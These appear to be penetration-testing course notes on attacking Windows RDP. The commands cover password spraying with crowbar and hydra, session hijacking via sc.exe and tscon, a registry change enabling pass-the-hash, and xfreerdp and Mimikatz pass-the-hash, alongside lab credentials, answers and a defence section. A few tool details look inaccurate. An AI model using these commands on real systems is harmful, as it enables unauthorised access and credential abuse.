# 🔓 RDP (Remote Desktop Protocol) Attacks

## 🎯 Overview

This document covers **exploitation techniques** against RDP services, focusing on practical attack methodologies from HTB Academy's "Attacking Common Services" module. RDP attacks can lead to **unauthorized remote access, privilege escalation, session hijacking, and lateral movement**.

> **"Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft which provides a user with a graphical interface to connect to another computer over a network connection. Unfortunately, while RDP greatly facilitates remote administration of distributed IT systems, it also creates another gateway for attacks."**

## 🏗️ RDP Attack Methodology

### Attack Chain Overview
```
Service Discovery → Authentication Attacks → Session Exploitation → Privilege Escalation → Lateral Movement
```

### Key Attack Objectives
- **Password spraying** to avoid account lockouts
- **Session hijacking** for privilege escalation
- **Pass-the-Hash attacks** with NT hashes
- **GUI access** to Windows systems
- **Credential dumping** from RDP sessions

---

## 📍 Service Discovery & Enumeration

### Default RDP Port Detection
```bash
# Default RDP port: TCP/3389
# HTB Academy enumeration example
nmap -Pn -p3389 192.168.2.143

# Expected output
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```

### Advanced RDP Scanning
```bash
# Comprehensive RDP scan with scripts
nmap -Pn -sV -sC -p3389 192.168.2.143

# RDP version detection
nmap -p3389 --script rdp-ntlm-info 192.168.2.143

# Check for common vulnerabilities
nmap -p3389 --script rdp-vuln-* 192.168.2.143
```

### Key Information to Extract
- **RDP service version** (Windows version identification)
- **Authentication methods** supported
- **Certificate information** (self-signed vs CA)
- **Encryption levels** available
- **Domain membership** status

---

## ⚔️ Authentication Attacks

### 1. Password Spraying Attacks

#### Why Password Spraying?
```
Traditional brute force: Risk of account lockout
Password spraying: Single password against multiple users
Goal: Avoid triggering password policy restrictions
```

#### HTB Academy Username List
```bash
# Create username list
cat > usernames.txt << EOF
root
test
user
guest
admin
administrator
EOF
```

### 2. Crowbar Password Spraying

#### Basic Crowbar Usage
```bash
# HTB Academy example - single password against user list
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

# Expected successful output
2022-04-07 15:35:50 START
2022-04-07 15:35:50 Crowbar v0.4.1
2022-04-07 15:35:50 Trying 192.168.220.142:3389
2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
2022-04-07 15:35:52 STOP
```

#### Advanced Crowbar Options
```bash
# Target multiple hosts
crowbar -b rdp -s 192.168.1.0/24 -U usernames.txt -c 'Spring2024!'

# Specify custom port
crowbar -b rdp -s 192.168.1.100:3390 -U usernames.txt -c 'password123'

# Multiple passwords (careful with lockouts)
crowbar -b rdp -s 192.168.1.100 -U usernames.txt -C passwords.txt
```

### 3. Hydra Password Spraying

#### HTB Academy Hydra Example
```bash
# Single password against username list
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

# Expected output
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:2/p:4), ~2 tries per task
[DATA] attacking rdp://192.168.2.147:3389/
[3389][rdp] host: 192.168.2.143   login: administrator   password: password123
1 of 1 target successfully completed, 1 valid password found
```

#### Optimized Hydra Commands
```bash
# Reduced connections to avoid detection
hydra -L usernames.txt -p 'password123' -t 1 -W 3 192.168.2.143 rdp

# Multiple targets with delay
hydra -L usernames.txt -p 'Spring2024!' -M targets.txt -t 4 -W 5 rdp

# Custom port scanning
hydra -L usernames.txt -p 'password123' -s 3390 192.168.1.100 rdp
```

---

## 🔗 RDP Connection Methods

### 1. rdesktop Client
```bash
# HTB Academy connection example
rdesktop -u admin -p password123 192.168.2.143

# Expected certificate warning
ATTENTION! The server uses an invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.
     Issuer: CN=WIN-Q8F2KTAI43A

Do you trust this certificate (yes/no)? yes
```

#### rdesktop Advanced Options
```bash
# Full screen connection
rdesktop -u administrator -p password123 -f 192.168.2.143

# Custom resolution
rdesktop -u admin -p password123 -g 1920x1080 192.168.2.143

# Enable sound and clipboard
rdesktop -u admin -p password123 -r sound:local -r clipboard:PRIMARYCLIPBOARD 192.168.2.143
```

### 2. xfreerdp Client
```bash
# Modern FreeRDP connection
xfreerdp /u:administrator /p:password123 /v:192.168.2.143

# With additional features
xfreerdp /u:admin /p:password123 /v:192.168.2.143 /dynamic-resolution /clipboard

# Ignore certificate errors
xfreerdp /u:admin /p:password123 /v:192.168.2.143 /cert-ignore
```

---

## 👤 Protocol Specific Attacks

### 1. RDP Session Hijacking

#### Attack Prerequisites
```
✅ Local Administrator privileges on target machine
✅ Another user connected via RDP
✅ SYSTEM-level access capability
✅ Windows Server 2016 or earlier (patched in 2019)
```

#### HTB Academy Session Hijacking Example

##### Step 1: Identify Active Sessions
```cmd
# Query current RDP sessions
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
```

##### Step 2: Create Hijacking Service
```cmd
# Create Windows service for session hijacking
C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```

##### Step 3: Execute Session Hijack
```cmd
# Start the hijacking service
C:\htb> net start sessionhijack

# Result: New terminal opens with hijacked user session (lewen)
```

#### Alternative Hijacking Methods
```cmd
# Direct tscon usage (requires SYSTEM privileges)
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}

# Using PsExec for SYSTEM privileges
psexec -s cmd.exe
tscon 2 /dest:rdp-tcp#13

# Using Mimikatz for privilege escalation
privilege::debug
token::elevate
```

### 2. RDP Pass-the-Hash (PtH) Attack

#### Attack Prerequisites & Limitations
```
⚠️  Restricted Admin Mode must be enabled
⚠️  Only works with NT hashes (not NTLMv2)
⚠️  Target must allow RDP connections
⚠️  User must have RDP rights on target
```

#### Enable Restricted Admin Mode
```cmd
# HTB Academy registry modification
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# Verify registry key creation
reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin
```

#### HTB Academy PtH Execution
```bash
# Pass-the-Hash with xfreerdp
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9

# Expected connection output
[09:24:10:115] [1668:1669] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[09:24:11:567] [1668:1669] [INFO][com.winpr.sspi.NTLM] - negotiateFlags "0xE2898235"

# Successful connection results in GUI access as target user
```

#### Alternative PtH Tools
```bash
# Using rdesktop with hash (if supported)
rdesktop -u lewen -p "" -d domain --hash 300FF5E89EF33F83A8146C10F5AB9BB9 192.168.220.152

# Using Mimikatz for PtH (Windows)
sekurlsa::pth /user:lewen /domain:corp /ntlm:300FF5E89EF33F83A8146C10F5AB9BB9 /run:"mstsc /v:192.168.220.152"
```

---

## 🎯 HTB Academy Lab Scenarios

### Scenario 1: Initial RDP Access
```bash
# Target: 10.129.203.13 (ACADEMY-ATTCOMSVC-WIN-01)
# Credentials: htb-rdp:HTBRocks!

# Connect using provided credentials
rdesktop -u htb-rdp -p HTBRocks! 10.129.203.13
# or
xfreerdp /u:htb-rdp /p:HTBRocks! /v:10.129.203.13

# Task: Find file on Desktop
# Answer: pentest-notes.txt
```

### Scenario 2: Registry Key Knowledge
```cmd
# Question: Which registry key needs to be changed to allow Pass-the-Hash with RDP?
# Answer: DisableRestrictedAdmin

# Registry path: HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa
# Value: DisableRestrictedAdmin (REG_DWORD) = 0x0
```

### Scenario 3: Administrator Access
```bash
# Task: Connect via RDP with Administrator account and find flag.txt

# Potential attack vectors:
# 1. Password spraying against Administrator account
crowbar -b rdp -s 10.129.203.13 -u administrator -C passwords.txt

# 2. Pass-the-Hash if NT hash is available
xfreerdp /v:10.129.203.13 /u:administrator /pth:HASH_VALUE

# 3. Session hijacking if another admin is logged in
# Look for flag.txt in common locations:
# - C:\flag.txt
# - C:\Users\Administrator\Desktop\flag.txt
# - C:\Users\Administrator\Documents\flag.txt
```

---

## 📋 RDP Attack Checklist

### Discovery & Enumeration
- [ ] **Port scanning** - TCP/3389 detection
- [ ] **Version enumeration** - Windows version identification
- [ ] **Certificate analysis** - Self-signed vs CA certificates
- [ ] **Domain membership** - Standalone vs domain-joined

### Authentication Attacks
- [ ] **Default credentials** - administrator:password, admin:admin
- [ ] **Password spraying** - Single password, multiple users
- [ ] **Common passwords** - Spring2024!, Password123, company name
- [ ] **Seasonal passwords** - Current year/month variations

### Post-Authentication
- [ ] **Session enumeration** - Active RDP sessions
- [ ] **User privilege checking** - Local admin rights
- [ ] **Session hijacking** - Target high-privilege users
- [ ] **Hash dumping** - Extract NT hashes for PtH

### Advanced Techniques
- [ ] **Pass-the-Hash** - Registry modification required
- [ ] **Kerberoasting** - Service account targeting
- [ ] **Golden/Silver tickets** - Kerberos ticket attacks
- [ ] **Lateral movement** - RDP to other systems

---

## 🛡️ Defense & Mitigation

### RDP Security Hardening
- **Network Level Authentication (NLA)** - Enable for all RDP connections
- **Strong password policies** - Prevent common password usage
- **Account lockout policies** - Limit failed login attempts
- **IP restrictions** - Whitelist authorized source IPs
- **Non-standard ports** - Change from default 3389
- **VPN requirements** - Require VPN for RDP access

### Registry Security
- **Disable Restricted Admin** - Prevent Pass-the-Hash attacks
- **Audit registry changes** - Monitor security-related modifications
- **Group Policy controls** - Centralized RDP security settings

### Monitoring & Detection
- **Failed authentication logs** - Event ID 4625 monitoring
- **Successful RDP logins** - Event ID 4624 tracking
- **Session creation/termination** - Event ID 4778/4779
- **Unusual source IPs** - Geographic/time-based anomalies
- **Registry modifications** - Monitor Lsa registry changes

---

## 🔗 Related Techniques

- **[SMB Attacks](smb-attacks.md)** - Credential extraction for RDP PtH
- **[SQL Attacks](sql-attacks.md)** - Database access for credential discovery
- **[Pass the Hash](../passwords-attacks/pass-the-hash.md)** - NT hash exploitation
- **[Active Directory Attacks](../passwords-attacks/active-directory-attacks.md)** - Domain privilege escalation
- **[Kerberoasting](../passwords-attacks/kerberoasting.md)** - Service account attacks

---

## 📚 References

- **HTB Academy** - Attacking Common Services Module
- **Microsoft RDP Documentation** - Official protocol specifications
- **Crowbar Tool** - RDP password spraying utility
- **FreeRDP Project** - Open-source RDP implementation
- **NIST Guidelines** - Remote access security best practices

---

*This document provides comprehensive RDP attack methodologies based on HTB Academy's "Attacking Common Services" module, focusing on practical exploitation techniques for penetration testing and security assessment.* 